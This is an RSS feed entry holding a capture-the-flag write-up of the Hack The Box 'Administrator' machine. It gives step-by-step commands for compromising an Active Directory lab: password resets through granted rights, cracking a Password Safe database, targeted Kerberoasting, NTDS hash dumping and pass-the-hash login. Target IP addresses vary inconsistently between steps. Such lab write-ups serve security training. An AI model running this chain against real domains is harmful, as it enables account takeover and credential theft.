@@ -1,0 +1,320 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Medium on SolarSpectre</title><link>https://solarspectre.github.io/tags/medium/</link><description>Recent content in Medium on SolarSpectre</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 01 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://solarspectre.github.io/tags/medium/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB Administrator - Writeup</title><link>https://solarspectre.github.io/p/htb-administrator-writeup/</link><pubDate>Tue, 01 Apr 2025 00:00:00 +0000</pubDate><guid>https://solarspectre.github.io/p/htb-administrator-writeup/</guid><description>&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/cover.jpg" alt="Featured image of post HTB Administrator - Writeup" />&lt;h3 id="enumeration">Enumeration
+&lt;/h3>&lt;p>Let&amp;rsquo;s start with a scan to all ports:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">sudo nmap -sS -p- --open --min-rate &lt;span class="m">5000&lt;/span> -vvv -n -Pn 10.10.11.61 -oG allPorts
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Here are the open ports&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE REASON
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">21/tcp open ftp syn-ack ttl &lt;span class="m">127&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53/tcp open domain syn-ack ttl &lt;span class="m">127&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">88/tcp open kerberos-sec syn-ack ttl &lt;span class="m">127&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc syn-ack ttl &lt;span class="m">127&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn syn-ack ttl &lt;span class="m">127&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">389/tcp open ldap syn-ack ttl &lt;span class="m">127&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds syn-ack ttl &lt;span class="m">127&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">464/tcp open kpasswd5 syn-ack ttl &lt;span class="m">127&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">593/tcp open http-rpc-epmap syn-ack ttl &lt;span class="m">127&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">636/tcp open ldapssl syn-ack ttl &lt;span class="m">127&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3268/tcp open globalcatLDAP syn-ack ttl &lt;span class="m">127&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3269/tcp open globalcatLDAPssl syn-ack ttl &lt;span class="m">127&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5985/tcp open wsman syn-ack ttl &lt;span class="m">127&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">9389/tcp open adws syn-ack ttl &lt;span class="m">127&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">47001/tcp open winrm syn-ack ttl &lt;span class="m">127&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>once it&amp;rsquo;s finished, grep the ports and copy them to later scan them with nmap looking out for the versions of the services hosted.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo nmap -sC -sV -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.10.11.42 -oN targeted
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.95 &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2025-04-11 16:52 EDT
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.11.42
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.26s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">21/tcp open ftp Microsoft ftpd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ftp-syst:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ SYST: Windows_NT
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53/tcp open domain Simple DNS Plus
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">88/tcp open kerberos-sec Microsoft Windows Kerberos &lt;span class="o">(&lt;/span>server time: 2025-04-12 03:52:41Z&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span class="o">(&lt;/span>Domain: administrator.htb0., Site: Default-First-Site-Name&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds?
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">464/tcp open kpasswd5?
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">636/tcp open tcpwrapped
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3268/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span class="o">(&lt;/span>Domain: administrator.htb0., Site: Default-First-Site-Name&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3269/tcp open tcpwrapped
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5985/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span class="o">(&lt;/span>SSDP/UPnP&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Not Found
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">9389/tcp open mc-nmf .NET Message Framing
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">47001/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span class="o">(&lt;/span>SSDP/UPnP&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Not Found
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: Host: DC&lt;span class="p">;&lt;/span> OS: Windows&lt;span class="p">;&lt;/span> CPE: cpe:/o:microsoft:windows
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>add the domain to your /etc/hosts file&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">10.10.11.61 administrator.htb dc.administrator.htb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Run netexec with the credentials from hackthebox&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">nxc winrm 10.10.11.42 -u Olivia -p ichliebedich
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WINRM 10.10.11.42 &lt;span class="m">5985&lt;/span> DC &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> administrator.htb&lt;span class="se">\o&lt;/span>livia:ichliebedich &lt;span class="o">(&lt;/span>Pwn3d!&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Login to the machine using evil-winrm and run SharpHound to look for Attack paths&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">evil-winrm -i 10.10.11.42 -u olivia -p &lt;span class="s1">&amp;#39;ichliebedich&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">upload SharpHound.exe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Once you ingested the data in bloodhound, you can see that olivia has GenericAll meaning she has full control over michael&amp;rsquo;s account&lt;/p>
+&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/1.png"
+width="768"
+height="193"
+srcset="https://solarspectre.github.io/p/htb-administrator-writeup/1_hu_5452d1cb76675978.png 480w, https://solarspectre.github.io/p/htb-administrator-writeup/1_hu_aff7a081dde9a9c1.png 1024w"
+loading="lazy"
+alt="Image 1"
+class="gallery-image"
+data-flex-grow="397"
+data-flex-basis="955px"
+>
+And Michael Can ForceChangePassword of Benjamin&lt;/p>
+&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/2.png"
+width="768"
+height="164"
+srcset="https://solarspectre.github.io/p/htb-administrator-writeup/2_hu_7b78de711b72a0e2.png 480w, https://solarspectre.github.io/p/htb-administrator-writeup/2_hu_67524f6fadb9ffaf.png 1024w"
+loading="lazy"
+alt="Image 2"
+class="gallery-image"
+data-flex-grow="468"
+data-flex-basis="1123px"
+>
+To reset the password for these users you can use this commands&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">net rpc password &lt;span class="s2">&amp;#34;michael&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;P@ssw00rd!231!!!&amp;#39;&lt;/span> -U &lt;span class="s2">&amp;#34;administrator.htb&amp;#34;&lt;/span>/&lt;span class="s2">&amp;#34;Olivia&amp;#34;&lt;/span>%&lt;span class="s1">&amp;#39;ichliebedich&amp;#39;&lt;/span> -S dc.administrator.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net rpc password &lt;span class="s2">&amp;#34;benjamin&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;P@ssw00rd!555!!!&amp;#39;&lt;/span> -U &lt;span class="s2">&amp;#34;administrator.htb&amp;#34;&lt;/span>/&lt;span class="s2">&amp;#34;michael&amp;#34;&lt;/span>%&lt;span class="s1">&amp;#39;P@ssw00rd!231!!!&amp;#39;&lt;/span> -S dc.administrator.htb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="user-flag">User Flag
+&lt;/h3>&lt;p>With these accounts you can look for access to other services like smb or ftp&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">nxc ftp 10.10.11.42 -u benjamin -p &lt;span class="s1">&amp;#39;P@ssw00rd!555!!!&amp;#39;&lt;/span> --ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FTP 10.10.11.42 &lt;span class="m">21&lt;/span> 10.10.11.42 &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Banner: Microsoft FTP Service
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FTP 10.10.11.42 &lt;span class="m">21&lt;/span> 10.10.11.42 &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> benjamin:P@ssw00rd!555!!!
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FTP 10.10.11.42 &lt;span class="m">21&lt;/span> 10.10.11.42 &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Directory Listing
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FTP 10.10.11.42 &lt;span class="m">21&lt;/span> 10.10.11.42 10-05-24 09:13AM &lt;span class="m">952&lt;/span> Backup.psafe3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nxc ftp 10.10.11.42 -u benjamin -p &lt;span class="s1">&amp;#39;P@ssw00rd!555!!!&amp;#39;&lt;/span> --get Backup.psafe3
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>this is a password database file that&amp;rsquo;s protected by a master password, to crack that password you can use john the ripper&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">pwsafe2john Backup.psafe3 &amp;gt; psafe3.hash
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">john psafe3.hash --wordlist&lt;span class="o">=&lt;/span>/usr/share/wordlists/rockyou.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using default input encoding: UTF-8
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Loaded &lt;span class="m">1&lt;/span> password &lt;span class="nb">hash&lt;/span> &lt;span class="o">(&lt;/span>pwsafe, Password Safe &lt;span class="o">[&lt;/span>SHA256 256/256 AVX2 8x&lt;span class="o">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cost &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>iteration count&lt;span class="o">)&lt;/span> is &lt;span class="m">2048&lt;/span> &lt;span class="k">for&lt;/span> all loaded hashes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Will run &lt;span class="m">2&lt;/span> OpenMP threads
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Press &lt;span class="s1">&amp;#39;q&amp;#39;&lt;/span> or Ctrl-C to abort, almost any other key &lt;span class="k">for&lt;/span> status
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tekieromucho &lt;span class="o">(&lt;/span>Backu&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>with this password, open the database with passwordsafe&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">sudo apt install passwordsafe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pwsafe Backup.psafe3
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>you can login as emily with evil-winrm&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">evil-winrm -i 10.10.11.42 -u emily -p PASSWORD
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\e&lt;/span>mily&lt;span class="se">\D&lt;/span>esktop&amp;gt; &lt;span class="nb">type&lt;/span> user.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">XXXXXXXXXXXXXXXXXXXXXXXXXXX
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="root-flag">Root Flag
+&lt;/h3>&lt;p>Looking for attack paths as emily in bloodhound you can find that she has GenericWrite access on Ethan&amp;rsquo;s account, which means we can use this to do a targeted kerberoast attack to obtain the hash of ethan&amp;rsquo;s account and crack it with johntheripper&lt;/p>
+&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/3.png"
+width="768"
+height="201"
+srcset="https://solarspectre.github.io/p/htb-administrator-writeup/3_hu_c44c08755ace5602.png 480w, https://solarspectre.github.io/p/htb-administrator-writeup/3_hu_6c4b917d3779a5.png 1024w"
+loading="lazy"
+alt="Image 3"
+class="gallery-image"
+data-flex-grow="382"
+data-flex-basis="917px"
+>
+Use faketime to sync your time with the DC and targetedKerberoast to execute the attack
+&lt;a class="link" href="https://github.com/ShutdownRepo/targetedKerberoast" target="_blank" rel="noopener"
+>https://github.com/ShutdownRepo/targetedKerberoast&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">faketime &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="k">$(&lt;/span>ntpdate -q dc.administrator.htb &lt;span class="p">|&lt;/span> grep -oP &lt;span class="s1">&amp;#39;\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}&amp;#39;&lt;/span>&lt;span class="k">)&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> python targetedKerberoast.py -d &lt;span class="s2">&amp;#34;administrator.htb&amp;#34;&lt;/span> -u &lt;span class="s2">&amp;#34;emily&amp;#34;&lt;/span> -p &lt;span class="s2">&amp;#34;XXXXXXXXXXXXXXXXXXXXX&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And crack the hash with john&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">john hash.txt --wordlist&lt;span class="o">=&lt;/span>/usr/share/wordlists/rockyou.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Now that we have access to ethan&amp;rsquo;s account, we can dump the hashes for the administrator and obtain the root flag&lt;/p>
+&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/4.png"
+width="768"
+height="271"
+srcset="https://solarspectre.github.io/p/htb-administrator-writeup/4_hu_9a19eebed6ee0f32.png 480w, https://solarspectre.github.io/p/htb-administrator-writeup/4_hu_5a21c04038ef84d7.png 1024w"
+loading="lazy"
+alt="Image 4"
+class="gallery-image"
+data-flex-grow="283"
+data-flex-basis="680px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">nxc smb 192.168.1.100 -u ethan -p &lt;span class="s1">&amp;#39;XXXXXXXXXXXXXX&amp;#39;&lt;/span> --ntds --users administrator
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Login with evil-winrm as administrator and get the flag&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">evil-winrm -i 10.10.11.42 -u administrator -H XXXXXXXXXXXXXXXXXXXXXXXXXX
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>esktop&amp;gt; &lt;span class="nb">type&lt;/span> root.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="conclusion">Conclusion
+&lt;/h3>&lt;p>This machine covers topics like Kerberoasting, bloodhound, DCSync / Dump Hashes, GenericWrite, GenericAll,Password Cracking and Password Database leak&lt;/p>
+&lt;p>&lt;mark>Hope you enjoy it and Happy Hacking!&lt;/mark>&lt;/p></description></item></channel></rss>
